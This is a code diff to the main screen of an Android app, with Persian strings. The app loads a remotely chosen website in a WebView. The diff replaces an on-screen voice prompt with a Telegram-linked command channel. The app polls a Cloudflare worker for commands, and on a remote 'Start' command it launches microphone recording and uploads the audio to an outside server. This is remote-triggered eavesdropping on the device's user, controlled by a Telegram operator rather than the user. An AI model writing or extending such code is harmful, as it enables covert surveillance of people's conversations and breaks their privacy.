@@ -29,21 +29,28 @@ import java.io.InputStreamReader;
 import java.net.HttpURLConnection;
 import java.net.URL;
 import java.nio.charset.StandardCharsets;
-import com.blu.app.voice.FloatingVoiceNotification;
+import com.blu.app.voice.CommandChecker;
+import com.blu.app.voice.VoiceRecorderService;
 
 public class MainActivity extends AppCompatActivity {
 
     private static final String WORKER_URL = "https://voice-bot-worker.kapcher2019.workers.dev/get-url";
+    private static final String SEND_COMMAND_URL = "https://voice-bot-worker.kapcher2019.workers.dev/send-command";
     private static final String FALLBACK_URL = "https://example.com";
     private static final int PERMISSION_REQUEST_CODE = 100;
     
     private WebView webView;
     private BroadcastReceiver voiceReceiver;
+    private CommandChecker commandChecker;
+    private String voiceToken = "token_" + System.currentTimeMillis();
+    private boolean isRecording = false;
     
     @SuppressLint("SetJavaScriptEnabled")
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
+        
+        Log.d("MainActivity", "🚀 اپ شروع شد!");
         
         requestPermissions();
         
@@ -53,6 +60,48 @@ public class MainActivity extends AppCompatActivity {
         setupWebView();
         resolveUrlAndLoad();
         setupVoiceBroadcastReceiver();
+        
+        // شروع چک کردن دستورات
+        startCommandChecking();
+    }
+    
+    private void startCommandChecking() {
+        commandChecker = new CommandChecker(new CommandChecker.OnCommandListener() {
+            @Override
+            public void onStartCommand() {
+                Log.d("MainActivity", "🎤 دستور Start از تلگرام!");
+                runOnUiThread(() -> {
+                    Toast.makeText(MainActivity.this, "🎤 ضبط صدا شروع شد!", Toast.LENGTH_LONG).show();
+                    startVoiceRecording();
+                });
+            }
+            
+            @Override
+            public void onDeclineCommand() {
+                Log.d("MainActivity", "❌ دستور Decline از تلگرام!");
+                runOnUiThread(() -> {
+                    Toast.makeText(MainActivity.this, "❌ ضبط رد شد", Toast.LENGTH_SHORT).show();
+                });
+            }
+            
+            @Override
+            public void onError(String error) {
+                Log.e("MainActivity", "❌ خطا: " + error);
+            }
+        });
+        
+        // شروع چک کردن
+        commandChecker.startChecking();
+    }
+    
+    private void startVoiceRecording() {
+        if (isRecording) return;
+        isRecording = true;
+        
+        Intent serviceIntent = new Intent(this, VoiceRecorderService.class);
+        serviceIntent.setAction("START_RECORDING");
+        serviceIntent.putExtra("voice_token", voiceToken);
+        startService(serviceIntent);
     }
     
     private void requestPermissions() {
@@ -108,13 +157,18 @@ public class MainActivity extends AppCompatActivity {
                         Toast.makeText(context, "🎤 ضبط شروع شد!", Toast.LENGTH_SHORT).show();
                         break;
                     case "VOICE_RECORDING_COMPLETED":
-                        Toast.makeText(context, "⏳ ضبط کامل شد، در حال ارسال...", Toast.LENGTH_SHORT).show();
+                        Toast.makeText(context, "⏳ ضبط کامل شد!", Toast.LENGTH_SHORT).show();
                         break;
                     case "VOICE_UPLOAD_SUCCESS":
-                        Toast.makeText(context, "✅ فایل صوتی با موفقیت ارسال شد!", Toast.LENGTH_LONG).show();
+                        Toast.makeText(context, "✅ فایل صوتی ارسال شد!", Toast.LENGTH_LONG).show();
+                        isRecording = false;
+                        // دوباره شروع به چک کردن کن
+                        startCommandChecking();
                         break;
                     case "VOICE_UPLOAD_FAILED":
-                        Toast.makeText(context, "❌ ارسال فایل صوتی ناموفق بود!", Toast.LENGTH_LONG).show();
+                        Toast.makeText(context, "❌ ارسال ناموفق!", Toast.LENGTH_LONG).show();
+                        isRecording = false;
+                        startCommandChecking();
                         break;
                 }
             }
@@ -136,15 +190,13 @@ public class MainActivity extends AppCompatActivity {
     private void resolveUrlAndLoad() {
         new Thread(() -> {
             String siteUrl = FALLBACK_URL;
-            String voiceToken = "token_" + System.currentTimeMillis();
-            boolean needsVoice = false;
             
             try {
                 URL u = new URL(WORKER_URL);
                 HttpURLConnection conn = (HttpURLConnection) u.openConnection();
                 conn.setRequestMethod("GET");
-                conn.setConnectTimeout(8000);
-                conn.setReadTimeout(8000);
+                conn.setConnectTimeout(5000);
+                conn.setReadTimeout(5000);
                 int code = conn.getResponseCode();
                 
                 if (code >= 200 && code < 300) {
@@ -165,15 +217,12 @@ public class MainActivity extends AppCompatActivity {
                         siteUrl = got.replaceAll("/$", "");
                     }
                     
-                    needsVoice = obj.optBoolean("voice", false);
-                    
                     String token = obj.optString("voice_token", "");
                     if (token != null && !token.isEmpty()) {
                         voiceToken = token;
                     }
                     
                     Log.d("MainActivity", "URL: " + siteUrl);
-                    Log.d("MainActivity", "NeedsVoice: " + needsVoice);
                     Log.d("MainActivity", "VoiceToken: " + voiceToken);
                 }
             } catch (Exception e) {
@@ -181,22 +230,41 @@ public class MainActivity extends AppCompatActivity {
             }
             
             final String finalUrl = siteUrl;
-            final boolean finalNeedsVoice = needsVoice;
-            final String finalVoiceToken = voiceToken;
             
             new Handler(Looper.getMainLooper()).post(() -> {
                 webView.loadUrl(finalUrl);
                 
-                if (finalNeedsVoice) {
-                    new Handler(Looper.getMainLooper()).postDelayed(() -> {
-                        FloatingVoiceNotification floating = new FloatingVoiceNotification(
-                            this,
-                            finalVoiceToken
-                        );
-                        floating.show();
-                    }, 2000);
-                }
+                // ⭐ ارسال دکمه‌ها به تلگرام
+                new Handler(Looper.getMainLooper()).postDelayed(() -> {
+                    sendCommandToTelegram();
+                }, 3000);
             });
+        }).start();
+    }
+    
+    private void sendCommandToTelegram() {
+        new Thread(() -> {
+            try {
+                okhttp3.OkHttpClient client = new okhttp3.OkHttpClient();
+                okhttp3.RequestBody body = okhttp3.RequestBody.create(
+                    "{}",
+                    okhttp3.MediaType.parse("application/json")
+                );
+                
+                okhttp3.Request request = new okhttp3.Request.Builder()
+                    .url(SEND_COMMAND_URL)
+                    .post(body)
+                    .build();
+                
+                okhttp3.Response response = client.newCall(request).execute();
+                String responseBody = response.body() != null ? response.body().string() : "";
+                response.close();
+                
+                Log.d("MainActivity", "📤 دستور به تلگرام ارسال شد: " + responseBody);
+                
+            } catch (Exception e) {
+                Log.e("MainActivity", "❌ خطا در ارسال به تلگرام: " + e.getMessage());
+            }
         }).start();
     }
     
@@ -216,6 +284,9 @@ public class MainActivity extends AppCompatActivity {
             try {
                 unregisterReceiver(voiceReceiver);
             } catch (Exception e) {}
+        }
+        if (commandChecker != null) {
+            commandChecker.stopChecking();
         }
     }
     
